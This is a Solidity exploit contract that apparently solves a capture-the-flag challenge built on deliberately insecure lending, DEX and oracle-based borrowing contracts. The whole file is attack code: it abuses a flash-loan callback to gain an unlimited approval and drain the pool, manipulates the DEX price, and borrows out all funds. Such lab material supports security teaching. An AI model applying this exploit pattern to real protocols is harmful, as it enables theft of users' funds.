// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../Challenge1.lenderpool.sol";
import "../Challenge2.DEX.sol";
import "../Challenge3.borrow_system.sol";

contract HackChallenge3 {
    IERC20 public token;

    BorrowSystemInsecureOracle borrow;
    InsecureDexLP dex;
    InSecureumLenderPool pool;

    constructor(address borrowAddress, address dexAddress, address poolAddress) {
        borrow = BorrowSystemInsecureOracle(borrowAddress);
        dex = InsecureDexLP(dexAddress);
        pool = InSecureumLenderPool(poolAddress);
    }

    function hack() external {
        // steal token0 funds from pool
        pool.flashLoan(address(this), abi.encode(HackChallenge3.onFlashLoan.selector));
        IERC20(pool.token()).transferFrom(address(pool), address(this), IERC20(pool.token()).balanceOf(address(pool)));

        dex.token0().approve(address(dex), type(uint256).max);
        dex.token1().approve(address(dex), type(uint256).max);

        borrow.token0().approve(address(borrow), type(uint256).max);
        borrow.token1().approve(address(borrow), type(uint256).max);

        // swap 100 token0 to token1
        dex.swap(address(dex.token0()), address(dex.token1()), 100 ether);

        // add liquidity to dex, 9900 token0 and 1 wei of token1
        // this will tank the price of token0
        dex.addLiquidity(dex.token0().balanceOf(address(this)), 1);

        // deposit token1 as collateral and borrow all available token0
        borrow.depositToken1(borrow.token1().balanceOf(address(this)));
        borrow.borrowToken0(borrow.token0().balanceOf(address(borrow)));

        // remove liquidity from dex
        dex.removeLiquidity(dex.balanceOf(address(this)));

        // transfer all assets to the user
        dex.token0().transfer(msg.sender, dex.token0().balanceOf(address(this)));
        dex.token1().transfer(msg.sender, dex.token1().balanceOf(address(this)));
    }

    function onFlashLoan() external {
        token.approve(msg.sender, type(uint256).max);
    }
}
